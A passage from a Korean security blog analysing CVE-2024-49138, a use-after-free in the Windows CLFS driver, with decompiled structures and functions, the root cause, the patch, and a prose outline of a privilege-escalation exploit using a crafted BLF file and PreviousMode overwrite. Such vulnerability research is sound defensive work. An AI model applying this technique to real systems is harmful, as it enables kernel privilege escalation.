<code>CClfsContainer</code> &#xAC1D;&#xCCB4;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xCEE4;&#xB110; &#xD3EC;&#xC778;&#xD130;&#xC5D0; &#xD574;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">unaligned</span> __<span class="hljs-title">declspec</span>(<span class="hljs-title">align</span>(8)) _<span class="hljs-title">CClfsBaseFilePersisted</span></span><span class="hljs-class">{</span>  _CClfsBaseFilePersisted_VTABLE_0_00000001C0014000::vtable *vftbl_0_00000001C0014000;  ULONG m_cref;  _BYTE gapC[<span class="hljs-number">4</span>];  PUCHAR m_pbImage;  ULONG m_cbImage;  _BYTE gap1C[<span class="hljs-number">4</span>];  __int64 m_presImage;  USHORT m_cBlocks;  _BYTE gap2A[<span class="hljs-number">6</span>];  CLFS_METADATA_BLOCK *m_rgBlocks;    &lt;- here!  PUSHORT m_rgcBlockReferences;       &lt;- here!  CLFSHASHTBL m_symtblClient;  CLFSHASHTBL m_symtblContainer;  CLFSHASHTBL m_symtblSecurity;  ULONGLONG size;  ULONG m_cbRawSectorSize;  BOOLEAN m_fgeneralBlockReferenced;  __declspec(align(<span class="hljs-number">4</span>)) __int64 pCclfsContainer;  __int64 event_a0;  __int64 field_A8;  <span class="hljs-keyword">char</span> file_ea_info[<span class="hljs-number">16</span>];  __int64 field_C0;  <span class="hljs-keyword">int</span> field_C8;  _BYTE gapCC[<span class="hljs-number">4</span>];  __int64 field_D0;  _UNICODE_STRING filepath;  RTL_BITMAP bitmap;  <span class="hljs-keyword">char</span> bitmapBuf[<span class="hljs-number">128</span>];  <span class="hljs-keyword">int</span> field_178;  _BYTE gap17C[<span class="hljs-number">4</span>];  <span class="hljs-keyword">char</span> field_180[<span class="hljs-number">16</span>];  <span class="hljs-keyword">char</span> field_190[<span class="hljs-number">16</span>];  <span class="hljs-keyword">char</span> n_writes[<span class="hljs-number">16</span>];  __int64 field_1B0;  __int64 controlrecord;  <span class="hljs-keyword">int</span> field_1C0;};</code></pre><p><code>CreateLogFile()</code> API&#xB97C; &#xD1B5;&#xD574; BLF &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xBA74; clfs.sys&#xB294; CClfsBaseFilePersisted &#xD074;&#xB798;&#xC2A4;&#xB97C; &#xD1B5;&#xD574; &#xBA54;&#xBAA8;&#xB9AC; &#xC788;&#xB294; BLF &#xD30C;&#xC77C;&#xC744; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;.</p><p>CClfsBaseFilePersisted &#xD074;&#xB798;&#xC2A4;&#xC5D0;&#xC11C; &#xC911;&#xC694;&#xD55C; &#xD544;&#xB4DC;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><code>m_rgBlocks</code> : CLFS_METADATA_BLOCK &#xAD6C;&#xC870;&#xCCB4; &#xBC30;&#xC5F4;&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xBC30;&#xC5F4; &#xAC12;&#xC73C;&#xB85C; CONTROL, GENERAL &#xB4F1; &#xBE14;&#xB85D;&#xB4E4;&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>m_rgcBlockReferences</code> : &#xAC01; &#xBE14;&#xB85D;&#xC5D0; &#xB300;&#xD55C; &#xCC38;&#xC870; &#xCE74;&#xC6B4;&#xD2B8;(reference count)&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xBC30;&#xC5F4;&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xD3EC;&#xC778;&#xD130;&#xC785;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C;, &#xBC30;&#xC5F4; &#xAC12;&#xC744; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xBE14;&#xB85D;&#xC774; &#xD604;&#xC7AC; &#xBA87; &#xAD70;&#xB370;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xB294;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CLFS_METADATA_BLOCK</span></span><span class="hljs-class">{</span>  PUCHAR pbImage;  ULONG cbImage;  ULONG cbOffset;  CLFS_METADATA_BLOCK_TYPE eBlockType;};</code></pre><p>CLFS_METADATA_BLOCK &#xAD6C;&#xC870;&#xCCB4;&#xC5D0;&#xC11C; <code>pbImage</code> &#xD544;&#xB4DC;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xB0B4; &#xBE14;&#xB85D;&#xC758; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xD3EC;&#xC778;&#xD130;&#xC774;&#xACE0; <code>eBlockType</code>&#xB294; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xBE14;&#xB85D;&#xC758; &#xC885;&#xB958;&#xB97C; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">enum</span> _CLFS_METADATA_BLOCK_TYPE{    ClfsMetaBlockControl,    ClfsMetaBlockControlShadow,    ClfsMetaBlockGeneral,      &lt;- here    ClfsMetaBlockGeneralShadow,    ClfsMetaBlockScratch,    ClfsMetaBlockScratchShadow} CLFS_METADATA_BLOCK_TYPE, *PCLFS_METADATA_BLOCK_TYPE;</code></pre><p>_CLFS_METADATA_BLOCK_TYPE&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74;, GENERAL &#xBE14;&#xB85D;&#xC758; <code>eBlockType</code>&#xC740; <code>ClfsMetaBlockGeneral</code>&#xC774;&#xBA70;, &#xC774; &#xAC12;&#xC740; 2&#xC5D0; &#xD574;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="root-cause"><a href="#root-cause" class="headerlink" title="root cause"></a>root cause</h3><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">CClfsBaseFile::AcquireMetadataBlock</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        _CClfsBaseFilePersisted *<span class="hljs-keyword">this</span>,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">enum</span> _CLFS_METADATA_BLOCK_TYPE blockType)</span></span><span class="hljs-function"></span>{  __int64 BlockType; <span class="hljs-comment">// rsi</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// edx</span>  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// r8d</span>  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// r9d</span>  BlockType = blockType;  v4 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">int</span>)BlockType &lt; <span class="hljs-number">0</span> || (<span class="hljs-keyword">int</span>)BlockType &gt;= <span class="hljs-keyword">this</span>-&gt;m_cBlocks )    <span class="hljs-keyword">return</span> <span class="hljs-number">0xC0000225</span>LL;  <span class="hljs-keyword">if</span> ( ++<span class="hljs-keyword">this</span>-&gt;m_rgcBlockReferences[BlockType] != <span class="hljs-number">1</span> )    <span class="hljs-keyword">return</span> v4;  v4 = ((__int64 (__fastcall *)(_CClfsBaseFilePersisted *, _QWORD))<span class="hljs-keyword">this</span>-&gt;vftbl_0_00000001C0014000-&gt;CClfsBaseFilePersisted::ReadMetadataBlock(ulong))(         <span class="hljs-keyword">this</span>,         (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)BlockType);  <span class="hljs-keyword">if</span> ( (v4 &amp; <span class="hljs-number">0x80000000</span>) != <span class="hljs-number">0</span> )  {    --<span class="hljs-keyword">this</span>-&gt;m_rgcBlockReferences[BlockType];    <span class="hljs-keyword">return</span> v4;  }  <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">this</span>-&gt;m_rgBlocks[BlockType].pbImage )    <span class="hljs-keyword">return</span> v4;[...]}</code></pre><p><code>CreateLogFile()</code> API&#xB97C; &#xD1B5;&#xD574; BLF &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xBA74; &#xC544;&#xB798; &#xC21C;&#xC11C;&#xB85C; &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</p><p><code>CClfsLogFcbPhysical::Initialize()</code> &#x2192; <code>CClfsBaseFilePersisted::OpenImage() -&gt; ReadImage()</code> &#x2192; <code>CClfsBaseFile::AcquireMetadataBlock()</code> </p><p><code>Initialize()</code> &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; CClfsBaseFilePersisted &#xAC1D;&#xCCB4;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; <code>AcquireMetadataBlock()</code> &#xD568;&#xC218;&#xB294; &#xBE14;&#xB85D;&#xC758; <code>m_rgcBlockReferences</code>&#xC758; &#xCC38;&#xC870; &#xCE74;&#xC6B4;&#xD2B8;&#xAC00; 0&#xC774;&#xB77C;&#xBA74;, <code>ReadMetadataBlock()</code>&#xC744; &#xD638;&#xCD9C;&#xD574; &#xBE14;&#xB85D;&#xC744; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>_CClfsBaseFilePersisted.m_rgBlocks</code> &#xBC30;&#xC5F4;&#xC758; &#xD574;&#xB2F9; <code>pbImage</code> &#xD544;&#xB4DC;&#xC5D0; &#xBE14;&#xB85D;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xAC00; &#xC124;&#xC815;&#xB418;&#xACE0;, <code>m_rgcBlockReferences</code> &#xBC30;&#xC5F4;&#xC758; &#xD574;&#xB2F9; &#xC778;&#xB371;&#xC2A4;&#xC5D0; &#xCC38;&#xC870; &#xCE74;&#xC6B4;&#xD2B8;&#xAC00; 1&#xB85C; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/06/18/ogu123/cve-2024-49138/image2.png" alt></p><p>&#xC704;&#xB294; <code>OpenImage()</code> &#xD568;&#xC218;&#xAC00; &#xC644;&#xB8CC;&#xB41C; &#xD6C4;&#xC758; &#xC0C1;&#xD0DC;&#xB85C; GENERAL &#xBE14;&#xB85D;&#xC774; <code>CClfsBaseFilePersisted.m_rgBlocks[2].pbImage = 0xFFFFD4000EF9A000</code>&#xC5D0; &#xB85C;&#xB4DC;&#xB418;&#xC5C8;&#xACE0; &#xD574;&#xB2F9; &#xCC38;&#xC870; &#xCE74;&#xC6B4;&#xD2B8;&#xAC00; 1&#xB85C; &#xC124;&#xC815;&#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">CClfsBaseFilePersisted::LoadContainerQ</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        _CClfsBaseFilePersisted *<span class="hljs-keyword">this</span>,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *<span class="hljs-keyword">const</span> a2,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> a3,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> __int8 a4,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">char</span> a5,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">union</span> _CLS_LSN a6,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *a7,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *a8,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> __int64 *pcbContainer)</span></span><span class="hljs-function"></span>{[...] BaseLogRecord = CClfsBaseFile::GetBaseLogRecord(<span class="hljs-keyword">this</span>);[...] rgContainers = BaseLogRecord-&gt;rgContainers;[...] rgContainers_1 = rgContainers;[..] <span class="hljs-keyword">while</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)k &lt; MAX_CONTAINERS_DEFAULT )  {[...]    offset = rgContainers_1[k];    <span class="hljs-keyword">if</span> ( offset )    {      <span class="hljs-keyword">if</span> ( offset &lt; <span class="hljs-number">0x1338</span> )        <span class="hljs-keyword">goto</span> error;      <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">int</span>)CClfsBaseFile::GetSymbol(<span class="hljs-keyword">this</span>, offset, k, (UCHAR **)&amp;container_context) &lt; <span class="hljs-number">0</span> )        <span class="hljs-keyword">goto</span> error;      container_context_2 = (CLFS_CONTAINER_CONTEXT *__shifted(_CLFSHASHSYM,<span class="hljs-number">0x30</span>))CClfsBaseFile::OffsetToAddr(                                                                                    <span class="hljs-keyword">this</span>,                                                                                    offset);      <span class="hljs-keyword">if</span> ( !container_context_2 )        <span class="hljs-keyword">goto</span> error;      v40 = (CLFS_CONTAINER_CONTEXT *)CClfsBaseFile::OffsetToAddr(<span class="hljs-keyword">this</span>, ADJ(container_context_2)-&gt;cbSymName);      v41 = v40;      <span class="hljs-keyword">if</span> ( !v40 )[...]      }      j_1 = (_CClfsContainer *)pcbContainer;      containerContext = container_context;[...] <span class="hljs-keyword">if</span> ( (containerContext-&gt;eState &amp; ClfsContainerInitializing) != <span class="hljs-number">0</span> )        {          containerContext-&gt;eState = ClfsContainerInactive;          ret = CClfsBaseFilePersisted::FlushImage(<span class="hljs-keyword">this</span>);            ret_2 = ret;          <span class="hljs-keyword">if</span> ( ret &lt; <span class="hljs-number">0</span> )            <span class="hljs-keyword">goto</span> LABEL_116;        }        v57 = &amp;a2[containerContext-&gt;cidQueue &amp; <span class="hljs-number">0x3FF</span>];        <span class="hljs-keyword">if</span> ( *v57 != <span class="hljs-number">-1</span> )        {LABEL_118:          ret = <span class="hljs-number">0xC01A000D</span>;          ret_2 = <span class="hljs-number">0xC01A000D</span>;LABEL_116:          ((<span class="hljs-keyword">void</span> (__fastcall *)(_CClfsContainer *))containerContext-&gt;pContainer-&gt;vftbl_0_00000001C0014040-&gt;CClfsContainer::Release(<span class="hljs-keyword">void</span>))(containerContext-&gt;pContainer);          containerContext-&gt;pContainer = <span class="hljs-number">0L</span>L;          v19 = a8;          v13 = a7;          v9 = a2;          <span class="hljs-keyword">goto</span> LABEL_145;[...]  }[...]}</code></pre><p><code>OpenImage()</code> &#xD568;&#xC218; &#xC774;&#xD6C4; <code>LoadContainerQ()</code>&#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>LoadContainerQ()</code> &#xD568;&#xC218;&#xB294; <code>_CLFS_BASE_RECORD_HEADER.rgContainers</code>&#xC5D0; &#xC5F0;&#xACB0;&#xB41C; &#xAC01; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xC5D0; &#xB300;&#xD574; <code>containerContext-&gt;eState</code>&#xAC00; <code>ClfsContainerInitializing</code> &#xAC12;&#xC744; &#xAC00;&#xC9C0;&#xBA74; <code>ClfsContainerInactive</code> &#xAC12;&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xD558;&#xACE0; &#xBCC0;&#xACBD;&#xB41C; &#xCEE8;&#xD14C;&#xC774;&#xB108; &#xC0C1;&#xD0DC; &#xC815;&#xBCF4;&#xB97C; &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xBC18;&#xC601;&#xD558;&#xAE30; &#xC704;&#xD574; <code>CClfsBaseFilePersisted::FlushImage(this);</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function">_int64 __fastcall <span class="hljs-title">CClfsBaseFilePersisted::WriteMetadataBlock</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        _CClfsBaseFilePersisted *<span class="hljs-keyword">this</span>,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">enum</span> _CLFS_METADATA_BLOCK_TYPE blocktype,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">char</span> a3)</span></span><span class="hljs-function"></span>{  [...]  blockType_1 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)blocktype;  pbImage = (CLFS_LOG_BLOCK_HEADER *)<span class="hljs-keyword">this</span>-&gt;m_rgBlocks[blockType_1].pbImage;  v27 = pbImage;  <span class="hljs-keyword">if</span> ( !pbImage )  {    ret = <span class="hljs-number">0xC01A000D</span>;    ret_1 = <span class="hljs-number">0xC01A000D</span>;    <span class="hljs-keyword">goto</span> LABEL_23;  }  pbImagenotnull = <span class="hljs-number">1</span>;  recordOffset = pbImage-&gt;RecordOffsets[<span class="hljs-number">0</span>];  v11 = ++*(_QWORD *)(&amp;pbImage-&gt;MajorVersion + recordOffset) &amp; <span class="hljs-number">1L</span>L;  m_rgBlocks = <span class="hljs-keyword">this</span>-&gt;m_rgBlocks;  [...]LABEL_9:  <span class="hljs-keyword">if</span> ( v11 )    ++pbImage-&gt;Usn;  container_idx = <span class="hljs-number">0</span>;[...] <span class="hljs-keyword">while</span> ( container_idx &lt; MAX_CONTAINERS_DEFAULT )  {    ret_1 = CClfsBaseFile::AcquireContainerContext(<span class="hljs-keyword">this</span>, container_idx, &amp;containercontext);    v15 = &amp;<span class="hljs-keyword">this</span>-&gt;vftbl_0_00000001C0014000 + container_idx;    <span class="hljs-keyword">if</span> ( ret_1 &gt;= <span class="hljs-number">0</span> )    {      containercontext_1 = containercontext;      v15[<span class="hljs-number">56</span>] = (_CClfsBaseFilePersisted_VTABLE_0_00000001C0014000::vtable *)containercontext-&gt;pContainer;      containercontext_1-&gt;pContainer = <span class="hljs-number">0L</span>L;      CClfsBaseFile::ReleaseContainerContext(<span class="hljs-keyword">this</span>, &amp;containercontext);    }    <span class="hljs-keyword">else</span>    {      v15[<span class="hljs-number">56</span>] = <span class="hljs-number">0L</span>L;    }    v25 = ++container_idx;  }[...]ret = ClfsEncodeBlock(pbImage, pbImage-&gt;TotalSectorCount &lt;&lt; <span class="hljs-number">9</span>, pbImage-&gt;Usn, <span class="hljs-number">0x10</span>u, <span class="hljs-number">1u</span>);  ret_1 = ret;<span class="hljs-keyword">if</span> ( ret &gt;= <span class="hljs-number">0</span> )  {    encodeBlock_successul = <span class="hljs-number">1</span>;    ret = CClfsContainer::WriteSector(            (_CClfsContainer *)<span class="hljs-keyword">this</span>-&gt;pCclfsContainer,            (PRKEVENT)<span class="hljs-keyword">this</span>-&gt;event_a0,            <span class="hljs-number">0L</span>L,            <span class="hljs-keyword">this</span>-&gt;m_rgBlocks[blockType].pbImage,            pbImage-&gt;TotalSectorCount,            &amp;a6);    ret_1 = ret;[...] <span class="hljs-keyword">if</span> ( pbImagenotnull )  {    <span class="hljs-keyword">if</span> ( encodeBlock_successul )    {      v17 = ClfsDecodeBlock(pbImage, pbImage-&gt;TotalSectorCount, pbImage-&gt;Usn, <span class="hljs-number">0x10</span>u, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)&amp;a6);      <span class="hljs-keyword">if</span> ( v17 &lt; <span class="hljs-number">0</span> ){            CClfsBaseFile::ReleaseMetadataBlock(<span class="hljs-keyword">this</span>, (<span class="hljs-keyword">enum</span> _CLFS_METADATA_BLOCK_TYPE)blockType_1);       }[...]</code></pre><p><code>FlushImage()</code> &#xD568;&#xC218; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; <code>CClfsBaseFilePersisted::WriteMetadataBlock()</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>&#xCEE8;&#xD14C;&#xC774;&#xB108; <code>pContainer</code> &#xD544;&#xB4DC; &#xCD08;&#xAE30;&#xD654;<ul><li>&#xCEE8;&#xD14C;&#xC774;&#xB108;&#xB4E4;&#xC744; &#xC21C;&#xD68C;&#xD558;&#xBA74;&#xC11C;, &#xAC01; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xC758; <code>CLFS_CONTAINER_CONTEXT.pContainer</code> &#xD544;&#xB4DC;&#xB97C; 0&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. (<code>containercontext_1-&gt;pContainer = 0LL;</code>). &#xC774;&#xB294; &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xAE30; &#xC804;&#xC5D0; <code>CClfsContainer</code> &#xAC1D;&#xCCB4;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xCEE4;&#xB110; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xBE44;&#xC6CC;&#xB450;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</li></ul></li><li>&#xC778;&#xCF54;&#xB529; &#x2192; &#xB514;&#xC2A4;&#xD06C; &#xC4F0;&#xAE30; &#x2192; &#xB514;&#xCF54;&#xB529;<ul><li><code>ClfsEncodeBlock()</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xBE14;&#xB85D;&#xC744; &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC778;&#xCF54;&#xB529;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC778;&#xCF54;&#xB529;&#xC774; &#xC131;&#xACF5;&#xD558;&#xBA74; <code>CClfsContainer::WriteSector()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xBE14;&#xB85D;&#xC744; BLF &#xD30C;&#xC77C;&#xC5D0; &#xC501;&#xB2C8;&#xB2E4;.</li><li>&#xB514;&#xC2A4;&#xD06C; &#xC4F0;&#xAE30; &#xC774;&#xD6C4;&#xC5D0;&#xB294; <code>ClfsDecodeBlock()</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xBE14;&#xB85D;&#xC744; &#xB2E4;&#xC2DC; &#xB514;&#xCF54;&#xB529; &#xD569;&#xB2C8;&#xB2E4; (&#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC6D0;&#xB798; &#xC0C1;&#xD0DC;&#xB85C; &#xBCF5;&#xC6D0;)</li></ul></li><li><code>ClfsDecodeBlock()</code> &#xC2E4;&#xD328; &#xC2DC; &#xCC98;&#xB9AC;<ul><li>&#xB9CC;&#xC57D; <code>ClfsDecodeBlock()</code>&#xC774; &#xC2E4;&#xD328;&#xD558;&#xBA74;, <code>CClfsBaseFile::ReleaseMetadataBlock()</code> &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC744; &#xD1B5;&#xD574; <code>CClfsBaseFilePersisted-&gt;m_rgcBlockReferences</code> &#xBC30;&#xC5F4;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xBE14;&#xB85D;&#xC758; &#xCC38;&#xC870; &#xCE74;&#xC6B4;&#xD2B8;&#xB97C; &#xAC10;&#xC18C;&#xC2DC;&#xD0A4;&#xACE0;, &#xB9CC;&#xC57D; &#xCC38;&#xC870; &#xCE74;&#xC6B4;&#xD2B8;&#xAC00; 0&#xC774; &#xB418;&#xBA74; &#xD574;&#xB2F9; &#xBE14;&#xB85D;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD574;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li></ol><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>ReleaseMetadataBlock()</code> &#xD568;&#xC218; &#xD638;&#xCD9C;&#xB85C; GENERAL &#xBE14;&#xB85D;&#xC774; &#xD574;&#xC81C;&#xB418;&#xC5B4;&#xB3C4; &#xC774;&#xD6C4;&#xC5D0; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xCEE4;&#xB110; &#xAC1D;&#xCCB4; &#xD3EC;&#xC778;&#xD130;&#xC778; <code>containerContext-&gt;pContainer</code>&#xB97C; &#xCEE8;&#xD2B8;&#xB864;&#xD560; &#xC218; &#xC788;&#xC5B4; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p><img src="/2025/06/18/ogu123/cve-2024-49138/image3.gif" alt></p><p>&#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; <code>ClfsEncodeBlock()</code>&#xD568;&#xC218;&#xB294; &#xC131;&#xACF5;&#xD558;&#xACE0;, <code>ClfsDecodeBlock()</code>&#xD568;&#xC218;&#xB294; &#xC2E4;&#xD328;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xACF5;&#xACA9;&#xC790; &#xC545;&#xC131; BLF &#xD30C;&#xC77C;&#xC744; &#xD1B5;&#xD574; clfs.sys&#xAC00; &#xBA54;&#xBAA8;&#xB9AC; &#xD574;&#xC81C; &#xD6C4; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC8FC;&#xC18C;&#xB97C; &#xCC38;&#xC870;&#xD558;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C;, &#xACF5;&#xACA9;&#xC790; &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xD574; &#xB454; fake &#xAC1D;&#xCCB4;&#xB97C; &#xD1B5;&#xD574; nt!DbgkpTriageDumpRestoreState &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574; 8&#xBC14;&#xC774;&#xD2B8; &#xC784;&#xC758; &#xC4F0;&#xAE30;&#xB97C; &#xC5BB;&#xC5B4; &#xD604;&#xC7AC; &#xC2A4;&#xB808;&#xB4DC;&#xC758; &#xAD8C;&#xD55C; &#xD544;&#xB4DC;(PreviousMode)&#xB97C; 0&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xD558;&#xC5EC; EoP&#xB97C; &#xD2B8;&#xB9AC;&#xAC70; &#xD569;&#xB2C8;&#xB2E4;.</p><p>PreviousMode&#xB97C; &#xD1B5;&#xD574; Full Arbitrary Kernel Read/Write &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xC5BB;&#xB294; &#xACFC;&#xC815;&#xC740; &#xC544;&#xB798; &#xC5F0;&#xAD6C;&#xAE00;&#xC744; &#xCC38;&#xACE0;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;! (&#xC0E4;&#xB77C;&#xC6C3; L0ch)</p><ul><li><a href="https://hackyboiz.github.io/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/">https://hackyboiz.github.io/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/</a></li></ul><h3 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h3><p><img src="/2025/06/18/ogu123/cve-2024-49138/image4.png" alt></p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>FlushImage()</code> &#xD638;&#xCD9C; &#xC804;&#xC5D0; <code>pContainer</code> &#xAC12;&#xC744; &#xBCC0;&#xC218;&#xC5D0; &#xBBF8;&#xB9AC; &#xC800;&#xC7A5;&#xD568;&#xC73C;&#xB85C;&#xC368;, <code>ClfsDecodeBlock()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC2E4;&#xD328;&#xD558;&#xB354;&#xB77C;&#xB3C4; &#xBBF8;&#xB9AC; &#xC800;&#xC7A5;&#xB41C; <code>pContainer</code> &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/MrAle98/CVE-2024-49138-POC/tree/master">https://github.com/MrAle98/CVE-2024-49138-POC/tree/master</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/heap-overflow/">heap overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/EoP/">EoP</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/CLFS/">CLFS</category>
      
      
